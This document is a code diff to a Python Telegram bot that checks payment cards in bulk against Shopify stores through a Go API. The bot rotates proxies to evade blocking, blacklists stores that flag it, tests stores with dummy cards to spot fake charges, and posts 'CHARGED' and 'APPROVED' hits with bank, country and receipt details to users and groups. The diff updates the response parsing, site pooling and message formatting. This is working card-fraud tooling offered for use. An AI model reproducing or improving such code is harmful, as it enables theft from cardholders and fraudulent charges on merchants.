@@ -162,12 +162,6 @@ _start_msh_gc()
 def invalidate_sites_cache():
     """No-op: msh.py reads `global_sites` from DB on every `get_sites()`
     call, so there is no cache to invalidate.
-
-    Fix 2 note: replicas read from MongoDB directly — no
-    `push_sites_to_all_replicas` calls exist anywhere in this file,
-    and none should be added. Adding them would reintroduce stale
-    per-replica caches and cause the "sites vanished after a save"
-    bug the DB-direct read already fixes.
     """
     pass
 
@@ -254,7 +248,9 @@ class ProxyManager:
         'too many redirects', 'redirect loop',
         'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND',
         'proxy error', 'bad gateway', 'empty psk', 'pasted_fields', '<b>Proxy Dead!</b>',
-        'tokenization blocked: 403 Forbidden (proxy/IP blocked)'
+        'tokenization blocked: 403 Forbidden (proxy/IP blocked)',
+        'vault:', 'cf 403', 'rate limited (429)', 'no token in response',
+        'proxy connect failed', 'proxy out of quota',
     ]
 
     def __init__(self, proxies_list: List[str], session_id: str):
@@ -322,8 +318,6 @@ class ProxyManager:
             return self._sanitize_proxy_url(proxy)
 
         if proxy.startswith('socks5://'):
-            # aiohttp / curl_cffi both handle socks5, but our engine
-            # (requests fallback) doesn't — reject for consistency.
             return None
 
         # `user:pass@host:port` (already URL-encoded in db_format)
@@ -331,13 +325,11 @@ class ProxyManager:
             return self._sanitize_proxy_url(f'http://{proxy}')
 
         # proxy.py db_format is `user pass host port` (space-separated).
-        # `user == "-" and pwd == "-"` is the no-auth placeholder.
         parts = proxy.split()
         if len(parts) == 4:
             user, pwd, host, port = parts
             if user == "-" and pwd == "-":
                 return f'http://{host}:{port}'
-            # db_format already URL-encodes user/pwd via proxy.py `build_dict`.
             return f'http://{user}:{pwd}@{host}:{port}'
 
         # `ip:port` (no auth)
@@ -416,6 +408,7 @@ class ProxyManager:
         if any(x in response_lower for x in ['receipt', 'could not extract', 'missing']):
             return False
 
+        # Go returns 200 for genuine card responses — never a proxy error.
         if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
             return False
 
@@ -788,9 +781,6 @@ def get_sites():
 
     Read MongoDB `global_sites` first, then fall back to sites.txt.
     Filters per-module ban list from banned_sites.json.
-
-    Fix 2: no cache, no replica push. The DB is the single source of
-    truth — every replica reads `global_sites` fresh here.
     """
     sites: list = []
 
@@ -838,27 +828,59 @@ def get_user_display(user_obj, plan_name):
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# API PROCESSING FUNCTION — 4-REPLICA FAILOVER
+# API PROCESSING FUNCTION — Go (main.go) contract
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def _check_go_health() -> dict:
+    """Return the JSON from the Go server's /health endpoint (or {})."""
+    try:
+        _http = _get_msh_http_session()
+    except Exception:
+        return {}
+    for base in _ordered_endpoints():
+        try:
+            async with _http.get(
+                f"{base.rstrip('/')}/health",
+                timeout=aiohttp.ClientTimeout(total=8),
+            ) as r:
+                if r.status == 200:
+                    return await r.json()
+        except Exception:
+            continue
+    return {}
+
 
 async def process_card_api(
     cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str
-) -> Tuple[bool, str, str, str, str, str, str, int]:
+) -> Tuple[bool, str, str, str, str, str, str, int, str]:
     """
-    Process card using the API cluster.
+    Process card using the Go API cluster (main.go).
 
     Returns:
-        Tuple of (success, message, url, gateway, price, currency,
-                  proxy_status, http_status)
+        (success, message, site, gateway, price, currency,
+         proxy_status, http_status, receipt)
 
-    Fix A: uses urllib.parse.quote(..., safe="") so `@`, `&`, `%` in proxy
-           passwords round-trip correctly through the query string.
-    Fix B: re-fetches the aiohttp session on every replica attempt so a
-           session closed by a network error doesn't kill subsequent tries.
+    Go server response (HTTP 200):
+        {
+          "Response": "ORDER_PLACED" | "CARD_DECLINED" | "OTP_REQUIRED" | ...,
+          "CC":       "5455122802569146|12|26|543",
+          "Price":    "10.00 USD",       # ALREADY suffixed with currency
+          "Currency": "USD",
+          "Gate":     "Shopify Payments",
+          "Charged":  "True" | "False",
+          "Approved": "True" | "False",
+          "Time":     "1.4s",
+          "Receipt":  "https://..."       # "" when not charged
+        }
+
+    Non-200 statuses:
+        400 -> missing / malformed CC
+        503 -> at capacity / no sites loaded on Go side
+        504 -> card check timeout (body contains "Response": "timeout")
     """
     cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
 
-    # Strip scheme prefix — api.py puts it back after decoding.
+    # Go API strips the scheme itself; keep it consistent.
     api_proxy = proxy
     for prefix in ("http://", "https://", "socks5://"):
         if api_proxy.startswith(prefix):
@@ -876,8 +898,9 @@ async def process_card_api(
 
     for base in _ordered_endpoints():
         endpoints_tried += 1
+        # Go ServeMux registers "/" as catch-all for handleCheck.
         endpoint_url = (
-            f"{base.rstrip('/')}/shopify"
+            f"{base.rstrip('/')}/"
             f"?site={quoted_site}"
             f"&cc={quoted_cc}"
             f"&key={quoted_key}"
@@ -894,42 +917,69 @@ async def process_card_api(
             async with _http.get(endpoint_url) as response:
                 http_status = response.status
 
+                # ── SUCCESS 200 — parse the real Go schema ─────────────
                 if response.status == 200:
                     data = await response.json()
                     _mark_endpoint_ok(base)
 
-                    gateway = data.get("Gateway", "Shopify Payments")
-                    price = data.get("Price", "0.00")
-                    proxy_raw = data.get("Proxy", "Live")
-                    api_response = data.get("Response", "Unknown Error")
-                    status = data.get("Status", False)
+                    api_response = str(data.get("Response", "Unknown Error"))
+                    gateway = str(data.get("Gate") or "Shopify Payments")
+                    price_raw = str(data.get("Price") or "0.00")
+                    currency = str(data.get("Currency") or "USD")
+                    receipt = str(data.get("Receipt") or "")
+                    charged = str(data.get("Charged", "False")).lower() == "true"
+                    approved = str(data.get("Approved", "False")).lower() == "true"
 
-                    if isinstance(status, str):
-                        success = status.lower() == "true"
-                    else:
-                        success = bool(status)
+                    # Go returns "10.00 USD" — strip the currency suffix so
+                    # display code can append currency itself.
+                    price = price_raw.strip()
+                    if " " in price:
+                        price = price.split(" ", 1)[0]
+                    if not price or price == "?":
+                        price = "0.00"
 
-                    proxy_status = "Live" if "live" in str(proxy_raw).lower() else "Dead"
+                    # Go does NOT return a Proxy field. Infer it from the
+                    # message text so Telegram still shows something honest.
+                    resp_lower = api_response.lower()
+                    proxy_dead = any(x in resp_lower for x in (
+                        "vault:", "proxy", "connection error",
+                        "connection refused", "timeout", "dns",
+                        "no such host", "cf 403", "rate limited",
+                    ))
+                    proxy_status = "Dead" if proxy_dead else "Live"
+
+                    success = charged or approved
 
                     return (
                         success, api_response, site, gateway, price,
-                        "USD", proxy_status, http_status,
+                        currency, proxy_status, http_status, receipt,
                     )
 
+                # ── non-200 — surface Go's error body, keep retryable text ──
                 _mark_endpoint_failed(base)
+                err_msg = ""
+                try:
+                    err_body = await response.json()
+                    err_msg = (
+                        str(err_body.get("Response") or "")
+                        or str(err_body.get("error") or "")
+                    )
+                except Exception:
+                    err_msg = ""
 
-                if response.status == 401:
-                    last_error = f"API Auth Error: HTTP 401 (check MSH_API_KEY)"
-                elif response.status == 403:
-                    last_error = f"API Forbidden: HTTP 403"
-                elif response.status == 404:
-                    last_error = f"API 404 — check URL path (/shopify) on {base}"
-                elif response.status in (502, 503, 504):
-                    last_error = f"API Unavailable: HTTP {response.status}"
+                if response.status == 400:
+                    last_error = f"Bad Request: {err_msg or 'invalid CC format'}"
+                elif response.status == 503:
+                    last_error = f"Service Unavailable: {err_msg or 'at capacity / no sites'}"
+                elif response.status == 504:
+                    last_error = err_msg or "timeout"
                 else:
-                    last_error = f"API Error: HTTP {response.status}"
+                    last_error = f"API Error HTTP {response.status}: {err_msg}"
 
-                logging.warning(f"[MSH API] {base} returned {response.status}, trying next replica")
+                logging.warning(
+                    f"[MSH API] {base} returned {response.status} "
+                    f"({err_msg or 'no body'}), trying next replica"
+                )
                 continue
 
         except asyncio.CancelledError:
@@ -937,32 +987,25 @@ async def process_card_api(
         except aiohttp.ClientConnectorError as ex:
             _mark_endpoint_failed(base)
             last_error = f"Connection Error: {str(ex)[:80]}"
-            logging.warning(f"[MSH API] {base} connection error, trying next replica")
             continue
         except asyncio.TimeoutError:
             _mark_endpoint_failed(base)
             last_error = "API Timeout"
-            logging.warning(f"[MSH API] {base} timeout, trying next replica")
             continue
         except aiohttp.ClientError as ex:
             _mark_endpoint_failed(base)
             last_error = f"Client Error: {str(ex)[:80]}"
-            logging.warning(f"[MSH API] {base} client error, trying next replica")
             continue
         except RuntimeError as ex:
-            # "Session is closed" — try a fresh session next iteration.
             if "Session is closed" in str(ex):
                 global _MSH_HTTP_SESSION
                 _MSH_HTTP_SESSION = None
                 last_error = "HTTP session closed — will retry with fresh session"
-                logging.warning(f"[MSH API] session closed during request, resetting")
                 continue
             last_error = f"API Exception: {str(ex)[:80]}"
-            logging.warning(f"[MSH API] {base} exception: {ex}, trying next replica")
             continue
         except Exception as ex:
             last_error = f"API Exception: {str(ex)[:80]}"
-            logging.warning(f"[MSH API] {base} exception: {ex}, trying next replica")
             continue
 
     logging.error(
@@ -971,7 +1014,7 @@ async def process_card_api(
     )
     return (
         False, last_error, site, "Shopify Payments", "0.00",
-        "USD", "Error", http_status,
+        "USD", "Error", http_status, "",
     )
 
 
@@ -1027,6 +1070,8 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
             response = card_data.get('response', 'N/A')
             bin_info = card_data.get('bin_info', {})
             price = card_data.get('price', 'N/A')
+            currency = card_data.get('currency', 'USD')
+            receipt = card_data.get('receipt', '')
 
             scheme = bin_info.get('scheme', 'N/A')
             bank = bin_info.get('bank', 'N/A')
@@ -1045,8 +1090,10 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
 
             lines.append(f"💎 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {status}")
             lines.append(f"💳 𝗖𝗮𝗿𝗱 ➛ {cc}")
-            lines.append(f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 {price} 𝗨𝗦𝗗")
+            lines.append(f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 {price} {currency}")
             lines.append(f"💬 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ {response}")
+            if receipt:
+                lines.append(f"🔗 𝗥𝗲𝗰𝗲𝗶𝗽𝘁 ➛ {receipt}")
             lines.append(f"<tg-emoji emoji-id='6237822905128851025'>🆔</tg-emoji> 𝗕𝗿𝗮𝗻𝗱 ➛ {scheme}")
             lines.append(f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ {bank}")
             lines.append(f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ {country_display}")
@@ -1071,20 +1118,17 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
 # MESSAGE SENDING HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, bin_data, user_obj, plan_name, proxy_status_formatted, price, site="Unknown Site", hit_type="CHARGED"):
+async def send_hit_log_to_group(
+    bot: Bot, cc_formatted, response_msg, bin_data, user_obj, plan_name,
+    proxy_status_formatted, price, site="Unknown Site", hit_type="CHARGED",
+    receipt: str = "", currency: str = "USD",
+):
     user_link = build_user_link(user_obj)
-    gateway_display = html_escape(f"Shopify {price} USD")
+    gateway_display = html_escape(f"Shopify {price} {currency}")
     safe_response = html_escape(str(response_msg))
     dev_link = '<a href="https://t.me/btcbuoy">Starkz</a>'
     user_display = f"{user_link} ({plan_name})"
     safe_proxy = str(proxy_status_formatted)
-    safe_site = html_escape(str(site))
-
-    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
-    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
-    country_name = html_escape(str(bin_data.get("country", "N/A")))
-    country_flag = bin_data.get("country_emoji", "")
-    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
 
     parts = str(cc_formatted).split('|')
     if len(parts) >= 1:
@@ -1104,8 +1148,11 @@ async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, bin_data, 
         f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ <b>{gateway_display}</b>\n"
         f"<tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{safe_response}</b>\n"
         f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
-        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / <tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
+        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / "
+        f"<tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
     )
+    if receipt:
+        caption += f"\n🔗 𝗥𝗲𝗰𝗲𝗶𝗽𝘁 ➛ <code>{html_escape(receipt)}</code>"
 
     reply_markup = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="LANXO", url="https://t.me/StarkzchkBot", icon_custom_emoji_id="5042097984083330584", style="primary")]
@@ -1122,14 +1169,18 @@ async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, bin_data, 
         logging.error(f"Error sending hit log: {e}")
 
 
-async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, send_to_extra: bool = True):
+async def send_approved_msg_to_user(
+    bot: Bot, cc_formatted, response_msg, bin_data,
+    proxy_status_formatted, api_price, user_obj, plan_name,
+    send_to_extra: bool = True, receipt: str = "", currency: str = "USD",
+):
     """Always sends the approved hit to the user's DM (private chat)."""
     bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
     bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
     country_name = html_escape(str(bin_data.get("country", "N/A")))
     country_flag = bin_data.get("country_emoji", "")
     bin_country = f"{country_flag} {country_name}" if country_flag else country_name
-    gateway_display = html_escape(f"Shopify {api_price} USD")
+    gateway_display = html_escape(f"Shopify {api_price} {currency}")
     safe_response = html_escape(str(response_msg))
     safe_proxy = str(proxy_status_formatted)
     gif_url = await get_anime_gif()
@@ -1146,8 +1197,11 @@ async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_da
         f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_bank}</b>\n"
         f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_country}</b>\n"
         f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
-        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / <tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
+        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / "
+        f"<tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
     )
+    if receipt:
+        caption += f"\n🔗 𝗥𝗲𝗰𝗲𝗶𝗽𝘁 ➛ <code>{html_escape(receipt)}</code>"
 
     reply_markup = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="btcbuoy", url="https://t.me/StarkzchkBot", icon_custom_emoji_id="5042097984083330584", style="primary")]
@@ -1200,7 +1254,11 @@ async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_da
                 logging.error(f"Error sending APPROVED HIT text to extra group {target_chat}: {inner_e}")
 
 
-async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name) -> bool:
+async def send_charged_msg_to_user(
+    bot: Bot, cc_formatted, response_msg, bin_data,
+    proxy_status_formatted, api_price, user_obj, plan_name,
+    receipt: str = "", currency: str = "USD",
+) -> bool:
     """Sends the charged hit to the user's DM + all extra charged groups.
     Returns True if it reached AT LEAST ONE extra charged group."""
     bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
@@ -1208,7 +1266,7 @@ async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_dat
     country_name = html_escape(str(bin_data.get("country", "N/A")))
     country_flag = bin_data.get("country_emoji", "")
     bin_country = f"{country_flag} {country_name}" if country_flag else country_name
-    gateway_display = html_escape(f"Shopify {api_price} USD")
+    gateway_display = html_escape(f"Shopify {api_price} {currency}")
     safe_response = html_escape(str(response_msg))
     safe_proxy = str(proxy_status_formatted)
     gif_url = await get_anime_gif()
@@ -1225,8 +1283,11 @@ async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_dat
         f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_bank}</b>\n"
         f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_country}</b>\n"
         f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
-        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / <tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
+        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / "
+        f"<tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
     )
+    if receipt:
+        caption += f"\n🔗 𝗥𝗲𝗰𝗲𝗶𝗽𝘁 ➛ <code>{html_escape(receipt)}</code>"
 
     reply_markup = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Starkz", url="https://t.me/StarkzchkBot", icon_custom_emoji_id="5042097984083330584", style="primary")]
@@ -1286,9 +1347,6 @@ async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_dat
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def get_result_buttons(session_id: str, is_running: bool = True) -> InlineKeyboardMarkup:
-    """Fix D: removed the always-false `if "msh" in ("mst", "mstr")` dead
-    branch — the elif was never reached so `checked` is the correct
-    "all" count."""
     session = MSH_SESSIONS.get(session_id, {})
     approved_count = session.get('approved', 0)
     dead_count = session.get('dead', 0)
@@ -1352,7 +1410,6 @@ async def update_progress_message(bot: Bot, session_id):
     if not session:
         return
 
-    # Guard against the tiny window between reply() and msg_id assignment.
     if session.get('msg_id') is None:
         return
 
@@ -1433,10 +1490,11 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         return
 
     is_group = session.get('is_group', False)
+    use_go_sites = session.get('use_go_sites', False)
 
-    sites_list = session.get('sites_list') or get_sites()
-    if not sites_list:
-        logging.error(f"[MSH] No sites available (checked DB + sites.txt) for session {session_id}")
+    sites_list = session.get('sites_list') or []
+    if not sites_list and not use_go_sites:
+        logging.error(f"[MSH] No sites available and Go-pool not enabled for session {session_id}")
         session['errors'] += 1
         session['checked'] += 1
         if session['checked'] % 3 == 0 or session['checked'] == session['total']:
@@ -1452,10 +1510,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             await update_progress_message(bot, session_id)
         return
 
-    # Fix L: FRAUD_SUSPECTED removed — it is a site-level risk gate, not a
-    # card-level decline. Leaving it in would mark live cards as DEAD on
-    # risk-blocked sites; removing it lets the else branch blacklist the
-    # site and retry, which is the correct behaviour.
     DECLINED_RESPONSES = [
         'CARD_DECLINED', 'PROCESSING_ERROR',
         'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR',
@@ -1469,13 +1523,17 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
     result_status = "ERROR"
     response_msg = "Unknown Error"
     api_price = "0.00"
+    api_currency = "USD"
+    api_receipt = ""
     proxy_status_formatted = "Unknown 🔴"
     bin_data = {}
     used_proxy = None
+    used_site = ""
+    used_gateway = "Shopify Payments"
 
     MAX_RETRIES = 15
     attempt = 0
-    rate_limit_streak = 0           # Fix H: bound total RL back-offs
+    rate_limit_streak = 0
 
     parts = cc_formatted.split('|')
     cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
@@ -1500,7 +1558,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         attempt += 1
 
         proxy_result = proxy_manager.get_next_proxy()
-
         if not proxy_result:
             logging.error(f"[MSH] No proxies available for session {session_id}")
             session['errors'] += 1
@@ -1515,43 +1572,48 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         if is_session_stopped(session_id):
             return
 
-        # Fix E: if every site is blacklisted, abort the card instead of
-        # picking the same dead site over and over for the remaining
-        # attempts.
-        blacklisted = GLOBAL_BLACKLISTED_SITES | session.get('_blacklisted_sites', set())
-        clean_sites = [s for s in sites_list if s not in blacklisted]
-        if not clean_sites:
-            logging.warning(
-                f"[MSH] All {len(sites_list)} sites blacklisted for session "
-                f"{session_id} — aborting card {cc_formatted}"
-            )
-            result_status = "ERROR"
-            response_msg = "All sites blacklisted (fake charge detected)"
-            break
-        site = random.choice(clean_sites)
+        # ── Site selection ────────────────────────────────────────────
+        if use_go_sites:
+            # Python has no sites — let Go pick from its own sites.txt
+            site = ""
+            used_site = "Go Pool"
+        else:
+            blacklisted = GLOBAL_BLACKLISTED_SITES | session.get('_blacklisted_sites', set())
+            clean_sites = [s for s in sites_list if s not in blacklisted]
+            if not clean_sites:
+                logging.warning(
+                    f"[MSH] All {len(sites_list)} sites blacklisted for session "
+                    f"{session_id} — aborting card {cc_formatted}"
+                )
+                result_status = "ERROR"
+                response_msg = "All sites blacklisted (fake charge detected)"
+                break
+            site = random.choice(clean_sites)
+            used_site = site
 
         try:
-            success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
+            success, message, url, gateway, price, currency, proxy_status_raw, http_status, receipt = await process_card_api(
                 cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy
             )
 
             if is_session_stopped(session_id):
                 return
 
+            used_gateway = gateway or "Shopify Payments"
+            api_price = price or "0.00"
+            api_currency = currency or "USD"
+            api_receipt = receipt or ""
+
             if "live" in str(proxy_status_raw).lower():
                 proxy_status_formatted = "Live <tg-emoji emoji-id='5039793437776282663'>🟢</tg-emoji>"
             else:
                 proxy_status_formatted = "Dead 🔴"
-
-            api_price = price
 
             proxy_manager.report_result(proxy, message, http_status)
 
             message_upper = message.upper()
             message_lower = message.lower()
 
-            # Fix K: strict CHARGED detection — avoids matching
-            # "PRE-CHARGED" / "CHARGED_BACK" from a rogue API response.
             is_charged_response = (
                 "ORDER_PLACED" in message_upper
                 or "ORDER PLACED" in message_upper
@@ -1559,6 +1621,21 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             )
 
             if is_charged_response:
+                if use_go_sites:
+                    # Can't identify which site Go used — no verification
+                    # possible. Accept the charge but warn loudly.
+                    logging.warning(
+                        f"[MSH] Go pool mode — skipping fake verification for charge on card {cc_formatted}. "
+                        f"Populate Python sites.txt to enable fake-charge detection."
+                    )
+                    print(
+                        f"\033[93m[WARN] Go pool mode: cannot verify charge for {cc_formatted} "
+                        f"(no Python sites to identify the store)\033[0m"
+                    )
+                    result_status = "CHARGED"
+                    response_msg = message
+                    break
+
                 logging.info(f"[MSH] Potential CHARGED on {site}. Running multi-card verification...")
 
                 FAKE_CARDS = [
@@ -1581,34 +1658,34 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                         response_msg = "Site Error (Blacklisted Fake Site)"
                         break
 
-                # Fix I: use a different proxy per fake card so a single
-                # dead proxy doesn't invalidate all four verification runs.
                 async def _verify_fake(fake_card):
                     fp = proxy_manager.get_next_proxy()
                     if not fp:
                         return False
                     fp_proxy, _ = fp
+                    fmsg = ""
+                    fmsg_http = None
                     try:
-                        _, fmsg, _, _, _, _, _, _ = await process_card_api(
+                        _, fmsg, _, _, _, _, _, fmsg_http, _ = await process_card_api(
                             cc=fake_card["cc"], mes=fake_card["mes"],
                             ano=fake_card["ano"], cvv=fake_card["cvv"],
-                            site=site, proxy=fp_proxy
+                            site=site, proxy=fp_proxy,
                         )
-                        fmsg_up = fmsg.upper()
-                        is_fake_charged = (
-                            "ORDER_PLACED" in fmsg_up
-                            or "ORDER PLACED" in fmsg_up
-                            or fmsg_up in {"CHARGED", "THANK YOU", "THANK_YOU",
-                                           "SUCCESS", "PAID", "APPROVED"}
+                        up = fmsg.upper()
+                        return (
+                            "ORDER_PLACED" in up
+                            or "ORDER PLACED" in up
+                            or up in {"CHARGED", "THANK YOU", "THANK_YOU",
+                                      "SUCCESS", "PAID", "APPROVED"}
                         )
-                        return is_fake_charged
                     except Exception:
                         return False
                     finally:
-                        try:
-                            proxy_manager.report_result(fp_proxy, fmsg, None)
-                        except Exception:
-                            pass
+                        if fmsg:
+                            try:
+                                proxy_manager.report_result(fp_proxy, fmsg, fmsg_http)
+                            except Exception:
+                                pass
 
                 fake_results = await asyncio.gather(
                     *[_verify_fake(fc) for fc in FAKE_CARDS],
@@ -1671,7 +1748,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 is_proxy_error = proxy_manager.is_real_proxy_error(message, http_status)
 
                 if is_proxy_error:
-                    # Fix H: real network error shouldn't consume a retry.
                     if attempt >= MAX_RETRIES:
                         result_status = "ERROR"
                         response_msg = f"Proxy Error: {message}"
@@ -1681,15 +1757,14 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                         await asyncio.sleep(0.1)
                         continue
                 else:
-                    session.setdefault('_blacklisted_sites', set()).add(site)
+                    if not use_go_sites and site:
+                        session.setdefault('_blacklisted_sites', set()).add(site)
 
                     is_rate_limit = any(rl in message_lower for rl in
                                         ["429", "too many requests", "http 429",
                                          "generic_error", "generic error", "throttled"])
                     if is_rate_limit:
                         rate_limit_streak += 1
-                        # Fix H: if we keep hitting RL on different sites,
-                        # bail — no more useful work to do.
                         if rate_limit_streak >= 5:
                             result_status = "ERROR"
                             response_msg = f"Rate limited {rate_limit_streak}x on different sites"
@@ -1699,7 +1774,7 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
                     if attempt < MAX_RETRIES:
                         logging.info(
-                            f"[MSH] Site {site} failed ({message[:50]}...) - "
+                            f"[MSH] Site {site or 'Go Pool'} failed ({message[:50]}...) - "
                             f"retrying with new site ({attempt}/{MAX_RETRIES})"
                         )
                         await asyncio.sleep(0.05)
@@ -1734,17 +1809,20 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
     if is_session_stopped(session_id):
         return
 
-    print(f"{cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")
-    logging.info(f"[MSH] {cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")
+    print(f"{cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'} | Site: {used_site}")
+    logging.info(f"[MSH] {cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'} | Site: {used_site}")
 
     card_result_data = {
         'card': cc_formatted,
         'response': response_msg,
         'bin_info': bin_data,
         'price': api_price,
-        'gateway': 'Shopify',
+        'currency': api_currency,
+        'gateway': used_gateway,
+        'receipt': api_receipt,
         'timestamp': datetime.now().isoformat(),
-        'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A'
+        'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A',
+        'site': used_site,
     }
 
     if is_session_stopped(session_id):
@@ -1756,19 +1834,19 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
         sent_to_extra = await send_charged_msg_to_user(
             bot, cc_formatted, response_msg, bin_data,
-            proxy_status_formatted, api_price, user_obj, plan_name
+            proxy_status_formatted, api_price, user_obj, plan_name,
+            receipt=api_receipt, currency=api_currency,
         )
 
         asyncio.create_task(
             send_hit_log_to_group(
                 bot, cc_formatted, response_msg, bin_data, user_obj,
-                plan_name, proxy_status_formatted, api_price, site, "CHARGED"
+                plan_name, proxy_status_formatted, api_price, used_site, "CHARGED",
+                receipt=api_receipt, currency=api_currency,
             )
         )
 
         if sent_to_extra:
-            # Fix J: await stats and logging separately so a failure in one
-            # doesn't mask the other.
             try:
                 await asyncio.to_thread(update_user_stats, user_id, True)
             except Exception as e:
@@ -1779,7 +1857,7 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 logging.error(f"[MSH] log_hit_to_mshh failed: {e}")
         else:
             logging.warning(
-                f"[MSH] CHARGED on {site} but delivery to extra groups failed — "
+                f"[MSH] CHARGED on {used_site} but delivery to extra groups failed — "
                 f"counting as hit only, not as a charge."
             )
             try:
